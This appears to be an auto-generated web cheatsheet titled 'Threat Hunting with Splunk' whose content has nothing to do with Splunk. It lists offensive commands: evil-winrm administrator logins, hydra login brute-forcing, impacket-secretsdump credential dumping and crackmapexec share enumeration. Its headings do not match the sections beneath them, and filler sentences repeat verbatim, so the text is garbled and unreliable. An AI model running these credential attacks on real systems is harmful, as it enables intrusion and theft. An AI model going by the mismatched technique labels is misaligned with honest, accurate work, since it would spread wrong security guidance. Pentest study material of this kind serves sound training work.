---
TitleSEO: "Threat Hunting with Splunk | ZureFX"
TitlePost: "Threat Hunting with Splunk"
Author: "ZureFX"
Description: "Personal notes on Threat Hunting with Splunk. Quick reference for pentesting and CTF challenges."
Keywords: "cheatsheet, enumeration, linux, oscp, dfir, blue team"
URL: "https://zurefx.github.io/notes/note-threat-hunting-with-splunk-417.html"
URL_IMAGES: ""
Date: "2024-08-21"
Tags: "Cheatsheet, Enumeration, Linux, OSCP, DFIR, Blue Team"
Section: "notes"
Lang: "en"
main_img: "note-threat-hunting-with-splunk-417"
Permalink: "/notes/note-threat-hunting-with-splunk-417.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Kerberoasting

### Remote Code Execution

```bash
evil-winrm -i 10.106.206.128 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.25.198.198/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.220.244 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities. The kernel version was outdated and vulnerable to a publicly known exploit.

## LXD Privilege Escalation

### CentOS

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine.

- `smbexec`
- `ACL Abuse`
- `Sudo Misconfiguration`
- `Weak Service Permissions`
- `SQL Injection`
- `wmiexec`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.117.42.80 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.106.50.207 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## SeDebugPrivilege

### SQL Injection

```bash
evil-winrm -i 10.108.109.168 -u administrator -p 'P@ssw0rd!'
```

Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities.

## GPP Password

### SSRF

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.47.197.4
feroxbuster -h
```

```bash
crackmapexec smb 10.77.74.120 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p3268,9200,464 10.81.252.47 -oN scan.txt
```

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine.

```bash
gobuster dir -u http://10.26.201.191/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```bash
evil-winrm -i 10.70.176.17 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.98.177.208/FUZZ
crackmapexec smb 10.50.112.14 -u administrator -p 'P@ssw0rd!' --shares
```
